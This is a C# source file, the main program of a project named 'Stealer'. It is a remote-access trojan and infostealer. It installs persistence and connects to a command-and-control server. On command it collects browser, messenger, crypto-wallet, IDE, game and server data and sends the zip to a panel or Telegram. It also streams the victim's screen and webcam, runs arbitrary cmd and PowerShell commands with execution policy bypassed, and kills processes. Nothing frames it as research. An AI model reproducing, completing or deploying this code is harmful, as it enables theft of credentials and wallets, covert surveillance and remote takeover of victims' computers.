using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Stealer.Collectors;
using Stealer.Utils;

namespace Stealer
{
    class Program
    {
        private static string _clientId;
        private static readonly string CrashLog = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "whm_crash.log");

        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.UnhandledException += (s, e) =>
            {
                try { File.AppendAllText(CrashLog, DateTime.Now + " UNHANDLED: " + e.ExceptionObject + "\r\n"); } catch { }
            };

            try
            {
                Config.Initialize();
                _clientId = Environment.MachineName + "_" + Environment.UserName;

                try { Persistence.Install(); } catch { }

                C2Client.Connect(_clientId, HandleCommand);
            }
            catch (Exception ex)
            {
                try { File.AppendAllText(CrashLog, DateTime.Now + " MAIN ERR: " + ex + "\r\n"); } catch { }
            }

            while (true) { Thread.Sleep(60000); }
        }

        private static void HandleCommand(string command)
        {
            string cmd = command.Trim();
            string cmdLower = cmd.ToLower();

            if (cmdLower == "steal")
            {
                RunStealer();
            }
            else if (cmdLower == "uninstall")
            {
                try { Persistence.Uninstall(); } catch { }
                Environment.Exit(0);
            }
            else if (cmdLower.StartsWith("rdp_start"))
            {
                int fps = 5;
                int quality = 50;
                StreamMode mode = StreamMode.TileDelta;
                string[] parts = cmd.Split(':');
                if (parts.Length >= 2) int.TryParse(parts[1], out fps);
                if (parts.Length >= 3) int.TryParse(parts[2], out quality);
                if (parts.Length >= 4 && int.TryParse(parts[3], out int modeVal))
                {
                    if (Enum.IsDefined(typeof(StreamMode), modeVal))
                        mode = (StreamMode)modeVal;
                }
                ScreenStream.Start(fps, quality, mode);
            }
            else if (cmdLower.StartsWith("rdp_mode"))
            {
                string[] parts = cmd.Split(':');
                if (parts.Length >= 2 && int.TryParse(parts[1], out int modeVal))
                {
                    if (Enum.IsDefined(typeof(StreamMode), modeVal))
                        ScreenStream.SetMode((StreamMode)modeVal);
                }
            }
            else if (cmdLower == "rdp_stop")
            {
                ScreenStream.Stop();
            }
            else if (cmdLower.StartsWith("camera_start"))
            {
                int fps = 5;
                int quality = 50;
                int camIndex = 0;
                string[] parts = cmd.Split(':');
                if (parts.Length >= 2) int.TryParse(parts[1], out fps);
                if (parts.Length >= 3) int.TryParse(parts[2], out quality);
                if (parts.Length >= 4) int.TryParse(parts[3], out camIndex);
                CameraStream.Start(fps, quality, camIndex);
            }
            else if (cmdLower == "camera_stop")
            {
                CameraStream.Stop();
            }
            else if (cmdLower == "camera_list")
            {
                string jsonList = CameraStream.GetCameraListJson();
                C2Client.SendText("{\"type\":\"camera_list\",\"devices\":" + jsonList + "}");
            }
            else if (cmdLower.StartsWith("exec_cmd:"))
            {
                string payload = cmd.Substring("exec_cmd:".Length);
                RunShellCommand("cmd.exe", "/c chcp 65001 > nul 2>&1 & " + payload, "cmd_res");
            }
            else if (cmdLower.StartsWith("exec_ps:"))
            {
                string payload = cmd.Substring("exec_ps:".Length);
                RunShellCommand("powershell.exe",
                    "-NoProfile -ExecutionPolicy Bypass -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; " + payload.Replace("\"", "\\\"") + "\"",
                    "ps_res");
            }
            else if (cmdLower == "tasklist")
            {
                GetTaskList();
            }
            else if (cmdLower.StartsWith("kill:"))
            {
                string pidStr = cmd.Substring("kill:".Length);
                if (int.TryParse(pidStr, out int pid))
                {
                    KillProcess(pid);
                }
            }
        }

        private static void RunShellCommand(string filename, string args, string responseType)
        {
            Task.Run(() =>
            {
                try
                {
                    var psi = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = filename,
                        Arguments = args,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true,
                        StandardOutputEncoding = System.Text.Encoding.UTF8,
                        StandardErrorEncoding = System.Text.Encoding.UTF8
                    };
                    using (var p = System.Diagnostics.Process.Start(psi))
                    {
                        string output = p.StandardOutput.ReadToEnd();
                        string error = p.StandardError.ReadToEnd();
                        p.WaitForExit(10000);
                        string result = string.IsNullOrEmpty(error) ? output : (output + "\r\n[STDERR]\r\n" + error);
                        string escaped = result.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n");
                        C2Client.SendText("{\"type\":\"" + responseType + "\",\"output\":\"" + escaped + "\"}");
                    }
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"" + responseType + "\",\"output\":\"[ERROR] " + errEsc + "\"}");
                }
            });
        }

        private static void GetTaskList()
        {
            Task.Run(() =>
            {
                try
                {
                    var procs = System.Diagnostics.Process.GetProcesses();
                    var list = new System.Collections.Generic.List<string>();
                    foreach (var p in procs)
                    {
                        try
                        {
                            string pName = p.ProcessName.Replace("\\", "\\\\").Replace("\"", "\\\"");
                            string windowTitle = (p.MainWindowTitle ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", "");
                            long mem = 0;
                            try { mem = p.WorkingSet64 / 1024 / 1024; } catch { }
                            list.Add("{\"pid\":" + p.Id + ",\"name\":\"" + pName + "\",\"title\":\"" + windowTitle + "\",\"mem\":" + mem + "}");
                        }
                        catch { }
                    }
                    string json = "[" + string.Join(",", list.ToArray()) + "]";
                    C2Client.SendText("{\"type\":\"tasklist_res\",\"tasks\":" + json + "}");
                }
                catch { }
            });
        }

        private static void KillProcess(int pid)
        {
            Task.Run(() =>
            {
                try
                {
                    var p = System.Diagnostics.Process.GetProcessById(pid);
                    p.Kill();
                    C2Client.SendText("{\"type\":\"kill_res\",\"success\":true,\"pid\":" + pid + "}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"kill_res\",\"success\":false,\"pid\":" + pid + ",\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        private static void RunStealer()
        {
            try
            {
                using (var zip = new InMemoryZip())
                {
                    SystemInfoCollector.Collect(zip);
                    ChromiumCollector.Collect(zip);
                    GeckoCollector.Collect(zip);
                    MessengersCollector.Collect(zip);
                    CryptoCollector.Collect(zip);
                    IDECollector.Collect(zip);
                    GamesCollector.Collect(zip);
                    ServersCollector.Collect(zip);

                    if (zip.Count == 0) return;

                    byte[] zipData = zip.ToArray();
                    string fileName = $"Stealer_{Environment.UserName}_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.zip";

                    if (Config.Delivery.Equals("PANEL", StringComparison.OrdinalIgnoreCase))
                    {
                        Task.Run(() => PanelSender.SendZipAsync(zipData, fileName)).GetAwaiter().GetResult();
                    }
                    else
                    {
                        Task.Run(() => TelegramSender.SendZipAsync(zipData, fileName)).GetAwaiter().GetResult();
                    }
                }
            }
            catch { }
        }
    }
}
